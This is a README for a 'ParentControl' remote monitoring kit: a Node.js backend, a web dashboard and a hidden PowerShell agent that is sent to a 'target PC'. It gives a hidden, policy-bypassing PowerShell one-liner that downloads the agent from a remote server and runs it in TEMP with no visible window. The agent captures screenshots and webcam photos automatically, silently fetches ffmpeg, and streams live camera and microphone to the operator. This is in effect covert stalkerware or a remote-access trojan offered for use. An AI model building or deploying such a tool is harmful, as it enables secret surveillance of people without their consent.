# ParentControl — Remote Monitoring System

Real-time remote monitoring and control of Windows PCs via a web dashboard. 100% free hosting.

---

## Architecture

```
Frontend (GitHub Pages) ─── Socket.IO ──► Backend (Render.com) ◄── Raw WebSocket ── Child PC (.bat)
```

---

## STEP 1 — Deploy Backend to Render.com (Free)

1. Push this project to a **GitHub repository**
2. Go to [render.com](https://render.com) → **New Web Service**
3. Connect your GitHub repo
4. Settings:
   - **Root Directory:** `backend`
   - **Runtime:** Node
   - **Build Command:** `npm install`
   - **Start Command:** `node server.js`
5. Add **Environment Variables:**
   | Key | Value |
   |-----|-------|
   | `ADMIN_PASSWORD` | Your chosen password |
   | `PORT` | 3000 |
6. Deploy → Copy your URL: `https://your-app.onrender.com`

---

## STEP 2 — Update URLs in Files

After getting your Render URL, update these **3 places**:

### `frontend/app.js` — Line 6
```javascript
const BACKEND_URL = 'https://YOUR-APP.onrender.com';  // ← paste your Render URL
```

### `client/connect.bat` — Line 5
```bat
set "SERVER=https://YOUR-APP.onrender.com"
```

### `client/client.ps1` — Line 6
```powershell
[string]$ServerUrl = "https://YOUR-APP.onrender.com"
```

---

## STEP 3 — Deploy Frontend to GitHub Pages (Free)

1. Push updated code to GitHub
2. Go to repo **Settings → Pages**
3. Source: **Deploy from branch**
4. Branch: `main`, Folder: `/frontend`
5. Save → Dashboard at: `https://yourusername.github.io/your-repo`

---

## STEP 4 — Connect a Child PC

### Option A — Double-click (send `connect.bat` to target PC)
```
Just double-click connect.bat — no window appears, runs silently
```

### Option B — Single CMD command (paste into CMD on target PC)
```cmd
powershell -w h -ep bypass -c "[Net.ServicePointManager]::SecurityProtocol='Tls12';(New-Object Net.WebClient).DownloadFile('https://YOUR-APP.onrender.com/download/client.ps1','$env:TEMP\pca.ps1');Start-Process powershell '-w h -ep bypass -File $env:TEMP\pca.ps1 -ServerUrl https://YOUR-APP.onrender.com' -WindowStyle Hidden"
```

> ✅ The device connects and shows a **6-digit code** in the dashboard within seconds.
> ✅ Screenshot and camera photo are captured **automatically** on first connect.

---

## STEP 5 — Use the Dashboard

Open: `https://yourusername.github.io/your-repo`

| Action | Result |
|--------|--------|
| 📸 Screenshot | Captures full screen, shows in dashboard |
| 📷 Camera | Takes webcam photo |
| 💡 Flash | Flashes screen white (0.35s) |
| 🎥 Live | Opens live camera + mic stream in modal |

---

## Features Summary

- **6-digit device code** — unique per device, shown in dashboard
- **Hidden mode** — no window, no taskbar icon on child PC
- **Auto-reconnect** — reconnects every 15 seconds if disconnected
- **Auto-capture** — screenshot + camera taken on first connect
- **Live stream** — real-time H.264 video + AAC audio via ffmpeg
- **ffmpeg auto-download** — downloads silently in background on first run
- **Password protected** — dashboard requires admin password

---

## Local Development & Testing

### Test backend locally:
```bash
cd backend
npm install
node server.js
```

### Test client locally (PowerShell):
```powershell
cd client
powershell -ExecutionPolicy Bypass -File client.ps1 -ServerUrl http://localhost:3000
```

### Open dashboard locally:
```
Open frontend/index.html in browser
Change BACKEND_URL in app.js to http://localhost:3000
```

---

## Project Structure

```
pc-monitor/
├── backend/
│   ├── server.js          ← Node.js + Express + Socket.IO + WebSocket server
│   └── package.json
├── frontend/
│   ├── index.html         ← Dashboard UI
│   ├── style.css          ← Dark glassmorphism design
│   └── app.js             ← Dashboard logic (Socket.IO client)
├── client/
│   ├── client.ps1         ← PowerShell hidden agent
│   └── connect.bat        ← One-click launcher
└── README.md
```

---

## Notes

- **Render Free Tier** sleeps after 15min inactivity. Client auto-reconnect loop wakes it up (30s delay on first reconnect).
- **ffmpeg** is ~50MB and downloads to `%TEMP%\pcagent\ffmpeg.exe` on first use. Camera/live stream only available after download.
- **Screenshots** work immediately without ffmpeg.
- Logs are saved to `%TEMP%\pcagent\agent.log` on the child PC.

---

## Troubleshooting

| Problem | Fix |
|---------|-----|
| Device not appearing in dashboard | Check if Render server is awake (visit the URL first) |
| Camera photo not working | Wait 2-3 min for ffmpeg to download on child PC |
| Live stream black screen | Ensure camera name is detected — check agent.log |
| CMD command not working | Run CMD as Administrator |
